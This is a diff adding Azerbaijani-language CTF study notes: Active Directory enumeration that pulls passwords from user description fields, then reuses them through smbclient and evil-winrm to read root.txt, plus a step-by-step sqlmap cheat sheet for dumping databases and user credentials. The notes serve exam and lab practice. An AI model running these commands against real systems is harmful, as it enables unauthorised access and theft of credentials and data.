@@ -245,3 +245,214 @@ Açılan terminalda yenə:
 type \\DomenController_IP\C$\Users\Administrator\Desktop\root.txt
 
 ```
+
+
+
+
+
+
+
+CTF (Capture The Flag) yarışlarında Active Directory istifadəçilərinin description (təsvir) sahəsində olan məlumatları tapmaq və həmin məlumatlarla flag-i əldə etmək üçün istifadə olunan real, konseptual komandaları aşağıdakı ardıcıllıqla tətbiq edə bilərsiniz.
+
+Yarış mühitindən asılı olaraq əlinizdə bir Linux (məsələn, Kali Linux) və ya şəbəkəyə daxil edilmiş bir Windows maşını ola bilər. Hər iki mühit üçün effektiv komandalar bunlardır:
+
+---
+
+### 1. AD İstifadəçilərinin "Description" Sahələrini Skan Etmək
+
+Məqsəd, bazadakı bütün istifadəçilərin təsvir sahələrini çəkib daxilində "password", "pass", "admin", "flag" kimi sözləri filtrləməkdir.
+
+#### Linux Mühitində (İmpacket və ya Netexec/CrackMapExec ilə):
+
+Əgər əlinizdə şəbəkəyə daxil olmaq üçün ilkin bir aşağı imtiyazlı istifadəçi adı (`user`) və parolu (`pass`) varsa:
+
+```bash
+# BloodHound üçün məlumat toplamaq (çox vaxt təsvirləri daxilində göstərir)
+bloodhound-python -u 'username' -p 'password' -d domain.local -dc dc.domain.local -c All
+
+# crackmapexec və ya nxc vasitəsilə istifadəçilərin təsvirlərini oxumaq
+nxc ldap 10.10.10.xx -u 'username' -p 'password' --users
+# (Bu komanda istifadəçilərin siyahısını və description sahələrini ekrana çıxaracaq)
+
+# LDAP üzərindən birbaşa sorğu göndərmək (ldapsearch ilə)
+ldapsearch -x -H ldap://10.10.10.xx -D "username@domain.local" -w "password" -b "DC=domain,DC=local" "(description=*)" description sAMAccountName
+
+```
+
+#### Windows Mühitində (PowerShell ilə):
+
+Əgər artıq bir Windows maşınına daxil olmusunuzsa, PowerShell vasitəsilə AD modulundan və ya ADSISearcher-dən istifadə edə bilərsiniz:
+
+```powershell
+# ActiveDirectory Modulu mövcuddursa:
+Get-ADUser -Filter * -Properties Description | Select-Object Name, Description | Where-Object {$_.Description -like "*pass*" -or $_.Description -like "*admin*"}
+
+# Modul yoxdursa (Təmiz PowerShell ADSI ilə):
+$searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(description=*))"
+$searcher.FindAll() | ForEach-Object {
+    New-Object PSObject -Property @{
+        Name = $_.Properties.samaccountname
+        Description = $_.Properties.description
+    }
+}
+
+```
+
+---
+
+### 2. Tapılan Hesabın Hüquqlarını və "Flag"-i Yoxlamaq
+
+Təsvir sahəsində tapdığınız istifadəçi adı və parolu ilə root flag-ni əldə etmək üçün həmin hesabın hara daxil ola bildiyini yoxlamalısınız. CTF-lərdə çox vaxt bu hesablara Admin resurslarına giriş icazəsi verilir.
+
+#### Şəbəkə Paylaşımlarını (SMB Shares) Yoxlamaq:
+
+Yüksək imtiyazlı hesablar çox vaxt `C$` (bütün diskin idarəçi paylaşımı) və ya `ADMIN$` qovluqlarına daxil ola bilir. Flag adətən Administratorun masaüstündə (`C:\Users\Administrator\Desktop\root.txt`) olur.
+
+Linux-dan bu paylaşımlara birbaşa daxil olub faylı oxumaq üçün:
+
+```bash
+# crackmapexec/nxc ilə C$ paylaşımına girişin olub-olmadığını yoxlamaq
+nxc smb 10.10.10.xx -u 'Tapılan_User' -p 'Tapılan_Parol' --shares
+
+# Əgər C$ üzərində "READ" və ya "WRITE" (Pwn3d!) görsəniz, smbclient ilə daxil olmaq:
+smbclient //10.10.10.xx/C$ -U 'domain.local\Tapılan_User%Tapılan_Parol'
+
+# Daxil olduqdan sonra flag-in yerinə getmək:
+cd Users\Administrator\Desktop
+get root.txt
+
+```
+
+#### PowerShell Remoting (WinRM) vasitəsilə daxil olmaq:
+
+Əgər tapılan hesabla sistemə tam idarəçi terminalı açmaq mümkündürsə (məsələn, hesaba `Remote Management Users` və ya `Administrators` hüququ verilibsə):
+
+```bash
+# Linux-dan WinRM vasitəsilə terminal bağlantısı qurmaq
+evil-winrm -i 10.10.10.xx -u 'Tapılan_User' -p 'Tapılan_Parol'
+
+# Bağlantı uğurlu olarsa, birbaşa terminal açılacaq və əmrləri icra edə bilərsiniz:
+type C:\Users\Administrator\Desktop\root.txt
+
+```
+
+---
+
+### CTF üçün Qısa Strategiya Özəti:
+
+1. İlkin istifadəçi ilə `nxc ldap <IP> -u user -p pass --users` komandasını icra edin.
+2. Çıxan siyahıda `Description` sütununda yazılan qeydləri diqqətlə oxuyun (məsələn: *“Password set to Admin123! temporarily”*).
+3. Tapdığınız yeni məlumatları `evil-winrm` və ya `smbclient` komandalarında yoxlayaraq Administrator qovluğuna keçid edib flag-i oxuyun.
+
+
+
+
+
+SQL injection (SQLi) zəifliklərini analiz etmək və verilənlər bazasındakı məlumatları çıxarmaq (dump etmək) üçün `sqlmap` alətinin ən çox istifadə olunan əmrlərinin "cheat sheet" (köməkçi təlimat) variantı aşağıdakı kimidir.
+
+İmtahanda və ya laboratoriyada vaxta qənaət etmək üçün addım-addım (pilləli) irəliləmək və hər mərhələdə əldə edilən məlumatı növbəti əmrə daxil etmək lazımdır.
+
+---
+
+### 1. İlkin Yoxlama (Zəifliyin təsdiqlənməsi)
+
+Hədəf URL-də SQL injection olub-olmadığını və hansı bazadan (MySQL, MSSQL, PostgreSQL və s.) istifadə edildiyini yoxlamaq üçün:
+
+```bash
+sqlmap -u "http://example.com/pages.php?id=1" --batch
+
+```
+
+* `--batch`: Proqramın qarşıya çıxan suallara avtomatik olaraq standart (default) "bəli" cavabını verməsini təmin edir, vaxt qazandırır.
+
+---
+
+### 2. Verilənlər Bazalarının (Database) Siyahısını Çəkmək
+
+Sistemdə mövcud olan bütün verilənlər bazalarının adlarını görmək üçün:
+
+```bash
+sqlmap -u "http://example.com/pages.php?id=1" --dbs --batch
+
+```
+
+*Bu əmrin nəticəsində sizə `target_db`, `information_schema` kimi baza adları qayıdacaq.*
+
+---
+
+### 3. Seçilmiş Bazanın Cədvəllərini (Tables) Siyahılamaq
+
+Məsələn, yuxarıdakı addımda maraqlı görünən bazanın adının `target_db` olduğunu gördünüz. İndi həmin bazanın daxilindəki cədvəlləri çıxarmaq lazımdır:
+
+```bash
+sqlmap -u "http://example.com/pages.php?id=1" -D target_db --tables --batch
+
+```
+
+*Bu əmrin nəticəsində `users`, `products`, `flags` kimi cədvəl adları çıxacaq.*
+
+---
+
+### 4. Seçilmiş Cədvəlin Sütunlarını (Columns) Görmək
+
+Məsələn, `users` və ya `flags` cədvəlinin daxilində hansı sütunların (məsələn: username, password, flag_id) olduğunu öyrənmək üçün:
+
+```bash
+sqlmap -u "http://example.com/pages.php?id=1" -D target_db -T users --columns --batch
+
+```
+
+---
+
+### 5. Məlumatların Tam Çıxarılması (Dump Etmək)
+
+Artıq baza (`-D`), cədvəl (`-T`) və sütunların (`-C`) adlarını bildiyiniz üçün lazımi məlumatları ekrana və ya fayla yazdırmaq (dump) olar:
+
+* **Spesifik sütunları dump etmək (Tövsiyə olunan):**
+```bash
+sqlmap -u "http://example.com/pages.php?id=1" -D target_db -T users -C username,password --dump --batch
+
+```
+
+
+* **Bütöv bir cədvəli tam olaraq dump etmək:**
+```bash
+sqlmap -u "http://example.com/pages.php?id=1" -D target_db -T flags --dump --batch
+
+```
+
+
+* **Bütün bazanı birdəfəlik dump etmək (Baza böyükdürsə vaxt apara bilər):**
+```bash
+sqlmap -u "http://example.com/pages.php?id=1" -D target_db --dump-all --batch
+
+```
+
+
+
+---
+
+### İmtahanda Qarşılaşa Biləcəyiniz Xüsusi Hallar Üçün Əmrlər
+
+* **POST Sorğularını Yoxlamaq (Login formaları və s.):**
+Əgər zəiflik GET parametrində deyil, POST sorğusundadırsa, Burp Suite vasitəsilə sorğunu tutub fayl kimi (məsələn `request.txt`) yadda saxlayın və bu əmri işlədin:
+```bash
+sqlmap -r request.txt --dbs --batch
+
+```
+
+
+* **Autentifikasiya (Cookie) Tələb Olunan Səhifələr:**
+Əgər flag-ı tapmaq üçün daxil olduğunuz istifadəçi sessiyasının daxilində axtarış edirsinizsə, Cookie dəyərini mütləq daxil etməlisiniz:
+```bash
+sqlmap -u "http://example.com/profile.php?id=5" --cookie="PHPSESSID=12345abcde" --dbs
+
+```
+
+
+* **Sürəti və Səviyyəni Artırmaq (Zəiflik çətin tapıldıqda):**
+Əgər standart sorğular nəticə vermirsə, sqlmap-ın yoxlama riskini və səviyyəsini artırmaq olar:
+```bash
+sqlmap -u "http://example.com/pages.php?id=1" --level=5 --risk=3 --dbs --batch
+
+```
